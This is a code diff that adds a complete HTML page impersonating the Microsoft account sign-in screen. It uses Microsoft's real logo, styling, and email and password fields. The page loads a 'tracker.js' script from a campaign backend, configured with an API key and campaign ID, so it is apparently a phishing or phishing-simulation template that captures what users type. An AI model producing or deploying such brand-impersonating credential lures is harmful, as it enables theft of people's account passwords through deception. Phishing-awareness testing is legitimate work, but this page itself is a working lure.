@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Microsoft Account</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-box {
+            background: white;
+            padding: 44px;
+            width: 360px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+
+        button {
+            background: #0067b8;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            float: right;
+        }
+
+        .footer {
+            margin-top: 50px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-box">
+        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9623580f73457b98cf39465a99.svg"
+            alt="Microsoft" width="108">
+        <h1>Sign in</h1>
+        <form id="loginForm">
+            <input type="email" name="login" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="passwd" placeholder="Password" required>
+            <div>
+                <a href="#" style="color: #0067b8; text-decoration: none; font-size: 13px;">Can't access your
+                    account?</a>
+            </div>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+
+    <!-- TRACKER CONFIGURATION -->
+    <!-- Replace the URL with your actual backend URL if different -->
+    <script src="http://127.0.0.1:5000/static/js/tracker.js"
+        data-api-key="ceabf30c61fb7c00bbed7c314ea443b9c7dbe436a435193cbd589e838f0e0adc" data-campaign-id="6">
+        </script>
+</body>
+
+</html>
